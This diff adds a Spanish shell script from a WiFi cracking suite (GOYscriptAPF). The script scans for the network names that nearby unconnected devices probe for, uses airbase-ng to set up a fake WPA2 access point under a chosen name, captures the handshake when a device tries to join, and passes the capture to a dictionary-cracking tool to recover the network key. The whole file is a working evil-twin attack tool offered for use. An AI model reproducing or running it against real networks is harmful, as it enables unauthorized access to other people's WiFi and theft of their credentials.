@@ -1,0 +1,499 @@
+#!/bin/sh
+# LISTA DE CAMBIOS
+# versión 3.1
+#	- Versión inicial:
+#	     Script que detecta las redes WiFi solicitadas por dispositivos que no están conectados.
+#	     El script crea un AP falso con el ESSID seleccionado y espera a que el dispositivo intente
+#	     conectarse a dicho AP, obteniendo así el handshake. Acto seguido ejecuta goyscriptDIC.
+# versión 3.2
+#	- Cambiado el tipo de encriptación del AP falso a WPA2-CCMP
+#	- Ahora se usa sólo un modo monitor (más que suficiente)
+# versión 3.4
+#	- Ahora al cancelar el proceso se vuelve al menú de selección de red
+
+
+##### CONSTANTES #####
+
+negro="\033[0;30m"
+rojo="\033[0;31m"
+verde="\033[0;32m"
+marron="\033[0;33m"
+azul="\033[0;34m"
+magenta="\033[0;35m"
+cyan="\033[01;36m"
+grisC="\033[0;37m"
+gris="\033[1;30m"
+rojoC="\033[1;31m"
+verdeC="\033[1;32m"
+amarillo="\033[1;33m"
+azulC="\033[1;34m"
+magentaC="\033[1;35m"
+cyanC="\033[1;36m"
+blanco="\033[1;37m"
+subrayar="\E[4m"
+parpadeoON="\E[5m"
+parpadeoOFF="\E[0m"
+resaltar="\E[7m"
+
+VERSION=$(cat VERSION)
+DEBUG="-hold"
+DEBUG="" #comentar esta línea para activar el modo depuración (impide que se cierre xterm)
+CANAL=1
+
+AIRMON="software/airmon-ng"
+AIRODUMP="software/airodump-ng"
+AIRCRACK="software/aircrack-ng"
+AIRBASE="./software/airbase-ng"
+WPACLEAN="./software/wpaclean"
+MOSTRAR_REDES_DETECTADAS="software/./goyscript_redes"
+FABRICANTE="software/./fabricante.sh"
+CAPTURA="captura"
+HANDSHAKES="handshakes"
+TMP="tmp"
+
+comprobar_ayuda()
+{
+echo -e $blanco
+echo "GOYscriptAPF $VERSION by GOYfilms"
+echo -e $grisC
+echo "Modo de uso: $0 [interfaz] [ESSID]"
+echo
+echo "Opciones:"
+echo "          ESSID  :especificar el ESSID (omite la búsqueda)"
+echo
+echo "Ejemplos: $0"
+echo "          $0 wlan1"
+echo "          $0 wlan0 WLAN_ABCD"
+echo -e "$grisC"
+exit 1
+}
+
+#COMPRUEBA SI HAY INTERFACES EN MODO MONITOR Y, SI LAS HAY, LAS DESACTIVA
+desactivar_todos_monX()
+{
+INTERFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
+let CUANTAS=`echo $INTERFACES_MONITOR | wc -w`
+let CONT=1
+while [ $CONT -le $CUANTAS ]
+do
+	MON=`echo $INTERFACES_MONITOR | awk '{print $'$CONT'}'`
+	$AIRMON stop $MON > /dev/null 2>&1
+	let CONT=$CONT+1
+done
+}
+
+#DETIENE POSIBLES PROCESOS EN MARCHA
+matar_procesos()
+{
+echo -e "$cyan""\n$1"
+echo -e "$grisC"
+PROCESOS=`ps -A | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc -e airbase-ng`
+while [ "$PROCESOS" != "" ]
+do
+	killall -q xterm ifconfig dhcpcd dhclient dhclient3 NetworkManager wpa_supplicant udhcpc airbase-ng >/dev/null 2>&1
+	PROCESOS=`ps -A | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc -e airbase-ng`
+done
+desactivar_todos_monX
+}
+
+#NOMBRE Y VERSIÓN DEL SCRIPT
+version()
+{
+SCRIPT=" GOYscriptAPF $VERSION by GOYfilms "
+N_SCRIPT=${#SCRIPT}
+N_VERSION=${#VERSION}
+let CARACTERES=$N_SCRIPT*3
+LINEA=`echo "══════════════════════════════════════════" | cut -c-${CARACTERES}`
+clear
+echo -e "$blanco\c"
+echo -e "╔${LINEA}╗"
+echo -e "║${SCRIPT}║"
+echo -e "╚${LINEA}╝"
+echo -e $grisC
+}
+
+comprobar_distribucion()
+{
+DISTRIBUCION=$(./software/./distro_linux.sh)
+case "$DISTRIBUCION" in
+"<Desconocida>")
+	echo -e $rojoC"Distribución de Linux desconocida$grisC"
+	echo -e $grisC;;
+*)
+	echo -e $verdeC"Distribución de linux detectada: $blanco$DISTRIBUCION"
+	echo -e $grisC;;
+esac
+}
+
+#ESPERA A QUE SE PULSE UNA TECLA
+pulsar_una_tecla()
+{
+echo
+echo -e $blanco"$1"$grisC" \c"
+read -n 1 TECLA
+echo
+echo
+if [ "$1" = "Pulsa una tecla para salir..." ]
+then
+	exit 1
+fi
+}
+
+#SELECCIÓN DE LA TARJETA WiFi
+seleccionar_tarjeta()
+{
+TARJETAS_WIFI_DISPONIBLES=`iwconfig --version | grep "Recommend" | awk '{print $1}' | sort`
+N_TARJETAS_WIFI=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print NF}'`
+if [ "$TARJETAS_WIFI_DISPONIBLES" = "" ]
+then
+	echo -e ""$rojoC"ERROR: No se detectó ninguna tarjeta WiFi"
+	echo -e "$grisC"
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+else
+	echo -e ""$cyan"Tarjetas WiFi disponibles:"$grisC""
+	echo
+	x=1
+	while [ $x -le $N_TARJETAS_WIFI ]
+	do
+		INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}'`
+		DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`
+		MAC=`ifconfig "$INTERFAZ" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | awk '{print toupper($0)}' | cut -c-8` #extraemos la MAC XX:XX:XX (sólo los 3 primeros pares)
+		FABRICANTE_INTERFAZ=`$FABRICANTE "$MAC"`
+		if [ $x -eq 1 ]
+		then
+			echo -e ""$cyan" Nº\tINTERFAZ\tDRIVER\t\tFABRICANTE"
+			echo -e ""$cyan" ══\t════════\t══════\t\t══════════"
+		fi
+		CARACTERES_DRIVER=`echo $DRIVER | wc -c` 
+		if [ $CARACTERES_DRIVER -gt 8 ] #CONTROLA LA TABULACIÓN DEPENDIENDO DE LOS CARACTERES QUE TENGA LA VARIABLE "DRIVER"
+		then
+			TAB=""
+		else
+			TAB="\t"
+		fi
+		echo -e ""$amarillo" $x)\t$INTERFAZ \t\t$DRIVER\t"$TAB"$FABRICANTE_INTERFAZ"
+		x=$((x+1))
+	done
+	if [ $N_TARJETAS_WIFI -gt 1 ] # SI DETECTA MAS DE UNA NOS PREGUNTA CUAL QUEREMOS
+	then
+		echo -e "\n"$cyan"\nSelecciona una tarjeta WiFi:\033[K\c"
+		echo -e ""$amarillo" \c"
+		read -n 1 OPCION
+		while [[ $OPCION < 1 ]] || [[ $OPCION > $N_TARJETAS_WIFI ]]
+		do
+			echo -en "\a\033[10C"$rojoC"OPCIÓN NO VÁLIDA"$grisC"    "
+			sleep 1
+			echo -en ""$cyan"\rSelecciona una tarjeta WiFi: "$amarillo"\033[K\c"
+			read -n 1 OPCION
+		done
+	else
+		OPCION=1
+	fi
+fi
+if [ $N_TARJETAS_WIFI -gt 1 ] # SI DETECTA MÁS DE UNA VARÍA EL MENSAJE
+then
+	INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$OPCION'}'`
+	MAC=`ifconfig "$INTERFAZ" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | awk '{print toupper($0)}' | cut -c-8` #extraemos la MAC XX:XX:XX (sólo los 3 primeros pares)
+	FABRICANTE_INTERFAZ=`$FABRICANTE "$MAC"`
+	echo -e "\n"
+	echo -e ""$cyan"Has seleccionado: "$verdeC"$INTERFAZ $grisC[$FABRICANTE_INTERFAZ]"
+	echo
+else
+	echo
+	echo -e ""$cyan"Sólo se ha detectado una tarjeta WiFi: "$verdeC"$INTERFAZ"$grisC"\033[K"
+	echo
+fi
+}
+
+#MUESTRA LA RESOLUCIÓN DE PANTALLA ACTUAL
+mostrar_resolucion_de_pantalla()
+{
+#CALCULAMOS LA RESOLUCION DE LA PANTALLA. DEPENDIENDO DE LA VERSION DE "xandr" SE RECORTA DE UNA FORMA U OTRA
+NORMAL="+sb -fg black -bg white"
+FUENTE="-fs 8"
+AIRODUMP_VENTANA="-geometry 100x14-0-0"
+which xdpyinfo > /dev/null 2>&1
+if [ $? -eq 0 ]
+then
+	RESOLUCION=`xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3`
+else
+	which xrandr > /dev/null 2>&1
+	if [ $? -eq 0 ]
+	then
+ 		RESOLUCION=`xrandr | grep "*" | awk '{print $1}'`
+ 		RESOLUCION=`echo $RESOLUCION | grep "x"`
+		if [ "$RESOLUCION" = "" ]
+		then
+			RESOLUCION=`xrandr | grep "current" | awk -F "current" '{print $2}' | awk -F " " '{print $1$2$3}' | awk -F "," '{print $1}'`
+			RESOLUCION=`echo $RESOLUCION | grep "x"`
+		fi
+		if [ "$RESOLUCION" = "" ]
+		then
+			RESOLUCION=`xrandr | grep "*" | awk '{print $2$3$4}'`
+			RESOLUCION=`echo $RESOLUCION | grep "x"`
+		fi
+	else
+		which Xvesa > /dev/null 2>&1
+		if [ $? -eq 0 ]
+		then
+			RESOLUCION=`Xvesa -listmodes 2>&1 | grep ^0x | awk '{ printf "%s %s\n",$2,$3 }' | sort -n | grep x[1-2][4-6] | tail -n 1 | awk -F 'x' '{print $1"x"$2}'`
+		else
+			RESOLUCION=""
+		fi
+	fi
+fi
+case $RESOLUCION in
+	1920x1080)
+		FUENTE="-fn 9x15bold"
+		AIRODUMP_VENTANA="-geometry 100x18-0-0";;
+	1280x1024)
+		FUENTE="-fs 8"
+		AIRODUMP_VENTANA="-geometry 100x31-0-0";;
+	1280x800)
+		FUENTE="-fs 8"
+		AIRODUMP_VENTANA="-geometry 100x14-0-0";;
+	1024x600)
+		FUENTE="-fs 8"
+		BUSCAR_REDES_VENTANA="-geometry 100x100-0+0";;
+	"")
+		RESOLUCION=""$rojoC"[no detectada]";;
+esac
+echo -e ""$cyan"Resolución de pantalla actual: "$verdeC"$RESOLUCION"$grisC""
+echo
+}
+
+#INICIALIZACIÓN DE LA TARJETA
+iniciar_tarjeta()
+{
+echo -e ""$cyan"Iniciando la tarjeta WiFi..."$grisC""
+echo
+ifconfig $INTERFAZ down
+ifconfig $INTERFAZ up
+iwconfig $INTERFAZ rate 1M
+}
+
+#ACTIVA EL MODO MONITOR DE LA INTERFAZ
+activar_modo_monitor()
+{
+software/./reiniciar_interfaz.sh $INTERFAZ
+MAC_INTERFAZ=`ifconfig "$INTERFAZ" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | awk '{print toupper($0)}'` #extraemos la MAC de la interfaz del comando 'ifconfig'
+echo -e ""$cyan"Activando modo monitor en $blanco$INTERFAZ $grisC("$MAC_INTERFAZ")$cyanC..."$grisC""
+$AIRMON start $INTERFAZ $CANAL
+ifconfig mon0 > /dev/null 2>&1
+if [ $? -ne 0 ] #SI LA ORDEN ANTERIOR NO SE COMPLETÓ CORRECTAMENTE, SIGNIFICA QUE NO EXISTE LA INTERFAZ "mon0"
+then
+	echo -e $grisC
+	echo -e $rojoC"ERROR: No se pudo activar el modo monitor"
+	echo -e $grisC
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+else
+	INTERFAZ_MONITOR=mon0
+fi
+}
+
+#BÚSQUEDA DE REDES
+buscar_redes()
+{
+if [ -x "/etc/rc.d/rc.wicd" ]; then
+   killwicd > /dev/null 2>&1
+else	
+   /etc/rc.d/rc.networkmanager stop > /dev/null 2>&1
+fi
+xterm $DEBUG -iconic -e $AIRODUMP --berlin 9999 -w ./$CAPTURA/wifis $INTERFAZ_MONITOR &
+echo -e "$cyan$parpadeoON"
+echo -e "╔════════════════════════════════╗"
+echo -e "║                                ║"
+echo -e "║$parpadeoOFF "$cyan" PULSA CONTROL+C PARA DETENER  $parpadeoON║"
+echo -e "║$parpadeoOFF "$cyan" LA  BÚSQUEDA  Y  SELECCIONAR  $parpadeoON║"
+echo -e "║$parpadeoOFF "$cyan" UNO DE LOS ESSIDs DETECTADOS  $parpadeoON║"
+echo -e "║                                ║"
+echo -e "╚════════════════════════════════╝"
+echo -e "$parpadeoOFF""$grisC"
+while [ ! -f "$CAPTURA/wifis-01.csv" ] #ESPERA A QUE SE GENERE EL ARCHIVO PARA CONTINUAR
+do
+	sleep 1
+done
+xterm $DEBUG -bg black -fg white -geometry 100x100-0+0 -title "BUSCANDO ESSIDs PROBADOS POR CLIENTES NO CONECTADOS" -e $MOSTRAR_REDES_DETECTADAS APF
+killall airodump-ng wash > /dev/null 2>&1
+}
+
+crear_carpetas()
+{
+mkdir -p "$CAPTURA" > /dev/null 2>&1
+mkdir -p "$HANDSHAKES" > /dev/null 2>&1
+mkdir -p "$TMP" > /dev/null 2>&1
+rm -rf $CAPTURA/*-01.* > /dev/null 2>&1
+rm -rf $TMP/replay_*.cap > /dev/null 2>&1
+rm -rf $TMP/*-01.* >/dev/null 2>&1
+}
+
+
+comprobar_permisos_solo_lectura()
+{
+rm -rf "prueba_permisos" > /dev/null 2>&1
+mkdir "prueba_permisos" > /dev/null 2>&1
+if [ $? -ne 0 ]
+then
+	echo -e $grisC
+	echo -e $rojoC"  ERROR: El dispositivo está montado como sólo lectura"
+	echo -e $cyanC"         Prueba a volver a montarlo con:"
+	echo -e $cyanC"         mount -o remount,rw <punto_de_montaje>"
+	echo -e $grisC
+	echo -e $cyanC"         Ejemplo:"
+	echo -e $cyanC"             mount -o remount,rw /mnt/sdb1"
+	echo -e $grisC
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+else
+	rm -rf "prueba_permisos" > /dev/null 2>&1
+fi
+}
+
+seleccionar_essid()
+{
+clear
+echo
+echo -e $cyanC"   Nº      MAC CLIENTE      SEÑAL   NOMBRE DE RED"
+echo -e $cyanC"   ==   =================   =====   ============="
+echo -en $blanco
+cat "$CAPTURA/listado-ESSIDs-probados.lst"
+let CUANTOS=`cat "$CAPTURA/listado-ESSIDs-probados.lst" | wc -l`
+if [ $CUANTOS -eq 1 ] #SI SÓLO SE HA DETECTADO UNA RED YA NO NOS DÁ A ESCOGER ;-D
+then
+	SELECCION=1
+else
+	echo
+	echo -e ""$cyan"\rSelecciona una red de la lista: "$amarillo"\c"
+	read SELECCION
+fi
+while [[ $SELECCION -lt 1 ]] || [[ $SELECCION -gt $CUANTOS ]]
+do
+	echo -en "\a\033[1A\033[40C"$rojoC"OPCIÓN NO VÁLIDA  "$grisC""
+	sleep 1
+	echo -en "\a\r"$cyan"Selecciona una red de la lista: \033[K"$amarillo"\c"
+	read SELECCION
+done
+ESSID=`sed -n ${SELECCION}p "$CAPTURA/listado-ESSIDs-probados2.csv" | awk -F "," '{print $3}' | sed 's/^ //' | tr -d '\r'`
+MAC_CLIENTE=`sed -n ${SELECCION}p "$CAPTURA/listado-ESSIDs-probados2.csv" | awk -F "," '{print $1}'`
+}
+
+capturar_paquetes()
+{
+rm -rf $TMP/"$ESSID"*.* >/dev/null 2>&1
+xterm $DEBUG $NORMAL $FUENTE $AIRODUMP_VENTANA -title "Capturando tráfico de \"$ESSID\"" -e $AIRODUMP --berlin 999 --bssid AA:AA:AA:AA:AA:AA -c 1,1 -w "$TMP/$ESSID (AA-AA-AA-AA-AA-AA)" $INTERFAZ_MONITOR &
+}
+
+crear_APs_falsos()
+{
+xterm $DEBUG -title "Falso AP (WPA)" -iconic -e "$AIRBASE" -a AA:AA:AA:AA:AA:AA -c 1 --essid "$ESSID" -Z 4 $INTERFAZ_MONITOR &
+}
+
+esperar_handshake()
+{
+echo -e $grisC
+while [ ! -f "$TMP/$ESSID (AA-AA-AA-AA-AA-AA)-01.cap" ] #espera a que se cree el archivo de captura
+do
+	sleep 1
+done
+AIRODUMP_FUNCIONANDO=`ps -A | grep airodump`
+while [ "$AIRODUMP_FUNCIONANDO" != "" ]
+do
+	$WPACLEAN "$TMP/$ESSID (AA-AA-AA-AA-AA-AA).cap" "$TMP/$ESSID (AA-AA-AA-AA-AA-AA)-01.cap" >/dev/null 2>&1
+	if [ -f "$TMP/$ESSID (AA-AA-AA-AA-AA-AA).cap" ]
+	then
+		HANDSHAKES=`$AIRCRACK "$TMP/$ESSID (AA-AA-AA-AA-AA-AA).cap" | grep " handshake)" | awk '{print substr ($0,56,13)}' 2>/dev/null`
+		echo -en $cyanC"\rEsperando a obtener el handshake... $blanco$HANDSHAKES"
+		if [ "$HANDSHAKES" = "(1 handshake)" ]
+		then
+			mv "$TMP/$ESSID (AA-AA-AA-AA-AA-AA).cap" "./handshakes"
+			break
+		fi
+	fi
+	sleep 1
+	AIRODUMP_FUNCIONANDO=`ps -A | grep airodump`
+done
+echo -e $grisC
+echo -e $grisC
+killall -q wpaclean aircrack-ng airodump-ng airbase-ng
+}
+
+buscar_clave()
+{
+echo "$ESSID (AA-AA-AA-AA-AA-AA).cap" > "$TMP/handshakes.lst"
+echo "(Diccionario automatico).dic" > "$TMP/diccionarios.lst"
+MAC_AP=`$AIRCRACK "handshakes/$ESSID (AA-AA-AA-AA-AA-AA).cap" | grep "1 handshake" | awk '{print $2}'`
+./goyscriptDIC --directo "$MAC_AP" "$ESSID"
+}
+
+comprobar_root()
+{
+USUARIO=`whoami`
+if [ "$USUARIO" != "root" ]
+then
+	echo -e $grisC
+	echo -e $rojoC"ERROR: Necesitas permisos de root para poder"
+	echo -e $rojoC"       ejecutar este script"
+	echo -e $grisC
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+fi
+}
+
+
+##### PROGRAMA PRINCIPAL #####
+
+version
+PARAMETROS="$*"
+comprobar_permisos_solo_lectura
+comprobar_root
+crear_carpetas
+if [ "$1" == "--help" ] || [ "$1" == "--ayuda" ] || [ "$1" == "/?" ]
+then
+	comprobar_ayuda
+fi
+REST=`ps -A | grep "restaurar_"`
+while [ "$REST" != "" ] #espera a que termine el script de restaurar los servicios (por si se ejecuta la suite dos veces muy seguidas)
+do
+	REST=`ps -A | grep "restaurar_"`
+done
+matar_procesos " Iniciando..."
+version
+comprobar_distribucion
+if [[ -e "/sys/class/net/$1/device/driver" ]]  #Para controlar si existe la interfaz pasada como parámetro.
+then                                           #Si no existe, muestra las que hay para que seleccionemos una
+	INTERFAZ=$1
+	if [ "$2" != "" ]
+	then
+		PARAMETRO_ESSID="SI"
+		ESSID="$2"
+	fi
+else
+	if [ "$1" != "" ]
+	then
+		PARAMETRO_ESSID="SI"
+		ESSID="$1"
+	fi
+	seleccionar_tarjeta
+fi
+mostrar_resolucion_de_pantalla
+iniciar_tarjeta
+nohup software/./restaurar_servicios.sh $$ >/dev/null 2>&1 & #inicia en segundo plano el script para restaurar los servicios al finalizar goyscript
+activar_modo_monitor
+if [ "$PARAMETRO_ESSID" != "SI" ]
+then
+	buscar_redes
+fi
+while true
+do
+	while [ "$HANDSHAKES" != "(1 handshake)" ]
+	do
+		if [ "$PARAMETRO_ESSID" != "SI" ]
+		then
+			seleccionar_essid
+		fi
+		capturar_paquetes
+		crear_APs_falsos
+		esperar_handshake
+	done
+	buscar_clave
+	pulsar_una_tecla "Pulsa una tecla para seleccionar otro ESSID..."
+	ESSID=""
+done
